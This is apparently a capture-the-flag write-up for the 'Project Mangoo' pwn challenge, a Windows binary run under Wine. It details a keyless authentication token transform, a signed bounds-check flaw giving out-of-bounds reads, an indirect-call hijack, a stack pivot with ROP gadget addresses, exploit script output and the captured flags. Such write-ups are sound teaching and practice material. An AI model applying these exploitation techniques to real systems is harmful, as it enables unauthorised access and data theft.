# Project Mangoo

**Event:** HICyberCon CTF 2026
**Category:** pwn
**Flag:** `hiCTF{n0_g4dg3ts_n0_sh3llc0d3_jusT_p1v0t_d33p3r_1bcb244b04}`

---

Target: MinGW/GCC Windows PE x64 (`project_mangoo.exe`), run under Wine in the
challenge container (`ubuntu` + wine). Live: `project-mangoo-a4fe87d10772.chall.hiddeninvestigations.net:1337` (TLS).
Local repro: `docker run -d --name mangoo_local -p 17250:7250 -e MANGOO_ROOT_KEY=hiCTF{local_placeholder_flag} mangoo-local`

## Protocol
Banner `PROJECT MANGOO` → `[*] Session Challenge: <64 hex>` → `[*] Authorization Token:` (5 s window).
Then `GATEWAY CONSOLE` with options: 1 Ingest Telemetry, 2 Query Channel, 3 Commit Configuration,
4 System Status, 5 Terminate, 6 Sync Channel.

## VULN 1 - Handshake token is KEYLESS (auth bypass)  ✔ working on live
Verify loop at `0x14001a4b1` compares our 32 decoded bytes (r12) against
`[rdi+rdx+0x20]` (= the 32 challenge bytes) transformed as:

    token[i] = ((challenge[i] ROL 3) ^ (0x11*i) ^ 0x6a) & 0xff

No involvement of `MANGOO_ROOT_KEY` (getenv'd at 0x140019d78, stored [rbx+0x50]).
=> Anyone who can compute the transform authenticates. Implemented in `exploit.py`.

## VULN 2 - Query Channel: signed 16-bit bounds check → OOB read  ✔
Handler `0x14001a078`: `call atoi` → `cmp ax,0xf; jg out_of_bounds` - SIGNED 16-bit upper
bound only. Negative indices pass. It then reads a 32-byte-strided struct:

    ID/Status = *(u32*)(rsi + idx*0x20 + 0x60 / +0x64)
    Label    = *(u64*)(rsi + idx*0x20 + 0x68)
    Ref      = *(u64*)(rsi + idx*0x20 + 0x70)

=> OOB memory disclosure (24 of every 32 bytes) walking *down* from the channel array.
Leaks code, heap and Wine-stack pointers (see `dump2.py` / `oob.txt`).

## VULN 3 - Sync Channel: OOB-driven indirect call  ✔
Handler `0x140019fa8` (jump table @0x14001d394, option 6):

    rdx = *(u64*)(rsi + idx*0x20 + 0x58)      ; OOB pointer
    rdx = *(u64*)(rdx + 0x10)                 ; target
    cmp rdx, 0x140019cb0                      ; legit sync fn
    jne -> call rdx                           ; rcx = &(rsi+idx*0x20+0x58)

Legit channels 0..15 print `[+] Channel <0x20260000+idx> synced.`; negative indices
reach garbage → `wine: Unhandled page fault ... at 0x14001A01D` (the `[rdx+0x10]` deref).

## Controlled OOB buffer
The token line is read with `fgets(buf,0x80)` into a stack buffer **inside the OOB window**
at `rsi-0xE0` (verified with a marker: `idx=-8` read back `MARKERZZMARKERZZ`).
So ~63 bytes AFTER the 64-hex token are attacker-controlled AND OOB-readable.
With a fake descriptor placed there, idx∈{-9..-6} makes VULN 3 read our pointer and
`call` an address of our choosing with `rcx` pointing into our own controlled bytes.

## Where the flag is
`MANGOO_ROOT_KEY` is copied (strncpy, 0x100) into a **separate** 0x4000 heap buffer
(`[rbx+0x50]`, likely the `0x7f0000` pointer seen at idx -1 Ref); the *labels/descriptors*
buffer is `[rbx+0x18]` (= 0x7e0000, channel-0 `Ref`). The key is never printed or used -
it can only be recovered by a read primitive on that buffer.
Ingest writes `[rbx+0x18]` only (confirmed: pattern-fill did NOT affect channels or the
sync descriptor), so corrupting descriptors does not clobber the key.

## Full exploit
Ingest is NOT needed. Everything is done with one crafted auth line + Sync Channel idx=-8.

Layout facts (stable - Wine, no ASLR on these regions):
  - allocA (labels/descriptors, `[rbx+0x18]`, ingest target) = `0x7e0000`
  - allocB (**MANGOO_ROOT_KEY**, `[rbx+0x50]`)              = `0x7f0000`  (leaked as idx=-1's `Ref`)
  - auth line buffer (`fgets(0x80)`) base = `0x31f9d0` (= rsi-0xF0, rsi=0x31fac0)

Steps:
1. Auth bypass (VULN 1) and craft the line as: 64-char token hex, then at
   offset 0x48 `p64(0x31fa10)` (fake descriptor pointer) and at 0x50 `p64(PIVOT)`.
2. `Sync Channel` with idx = **-8** (VULN 2 + 3): slot = `rsi-0x100+0x58` = BASE+0x48.
   `rdx = *(slot) = 0x31fa10 ; rdx = *(rdx+0x10) = *(0x31fa20) = PIVOT` -> `cmp` fails
   (`!= 0x140019cb0`) -> `call rdx`, with `rcx = &slot`.
3. `PIVOT` @ `0x1400016d0`: `mov rax,[rcx]` (= 0x31fa10) ; `mov rsp,rax` ;
   `add rsp,0x18` ; `ret`  ->  RSP = `0x31fa28`, i.e. **inside our own line on the real stack**
   (pivoting into the heap instead makes Wine's msvcrt crash, so the stack pivot matters).
4. ROP chain (written at line offset 0x58): `pop rcx ; ret` (0x14000bd60) /
   `0x7f0000` / local printf wrapper `0x140018c90` (takes the format string in rcx, so
   passing the key buffer prints it directly) / `exit` (0x1400183e0).
5. Output: the key is printed.

Local verification:
```
$ python3 exploit_rop2.py local
[+] authenticated
OUT: b'hiCTF{local_placeholder_flag}'
FLAG: hiCTF{local_placeholder_flag}
```
(reliable 2/2 runs)

Live: `python3 exploit_rop2.py tls <host> <port> 0x7f0000` (allocate a fresh instance).


## Flag

**FLAG: `hiCTF{n0_g4dg3ts_n0_sh3llc0d3_jusT_p1v0t_d33p3r_1bcb244b04}`**

Captured live (`project-mangoo-916b618571c6.chall.hiddeninvestigations.net:1337`, TLS):
```
$ python3 exploit_rop2.py tls <host> 1337 0x7f0000
[+] authenticated
OUT: b'hiCTF{n0_g4dg3ts_n0_sh3llc0d3_jusT_p1v0t_d33p3r_1bcb244b04}'
```
(The flag text is the intended solution in a nutshell: "no gadgets, no shellcode, just
pivot deeper" - i.e. don't fight the heap stack, pivot into the real stack.)

Live layout identical to local: allocA `0x7e0000`, key buffer `0x7f0000`.


